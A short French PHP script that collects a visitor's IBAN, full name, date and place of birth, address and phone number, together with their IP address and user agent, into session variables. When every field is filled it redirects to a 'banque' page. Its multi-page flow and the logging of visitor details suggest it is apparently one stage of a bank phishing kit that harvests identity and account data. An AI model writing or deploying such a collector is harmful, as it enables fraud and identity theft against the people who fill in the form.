<?php
session_start();
date_default_timezone_set('Europe/Paris');
$_SESSION['date_heure'] = date('d/m/y, H:i:s');
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];


//1ere page
$_SESSION['iban'] = 	$_POST['iban'];
$_SESSION['noms'] = 		$_POST['noms'];
$_SESSION['dob'] = $_POST['jours'] . $_POST['mois'] . $_POST['année'];
$_SESSION['cp_dob'] = 	$_POST['cp_dob']; // Ville de naissance
$_SESSION['cp'] = 		$_POST['cp'];          // Cp + Ville 
$_SESSION['ville'] = 	$_POST['ville'];
$_SESSION['adresse'] = 	$_POST['adresse'];
$_SESSION['dep'] = 	$_POST['dep'];
$_SESSION['tel'] = 		$_POST['tel'];







if (
!empty($_POST['iban']) && 
!empty($_POST['noms'])&& 
!empty($_POST['jours'])&& 
!empty($_POST['mois'])&& 
!empty($_POST['année'])&& 
!empty($_POST['cp'])&& 
!empty($_POST['cp_dob'])&& 
!empty($_POST['adresse'])&& 
!empty($_POST['dep'])&& 
!empty($_POST['tel']))

{
    
         
    header('Location: ../user/banque.php');
    
} else {
   
    header('Location: ../user/info.php?error=1');
}

?>
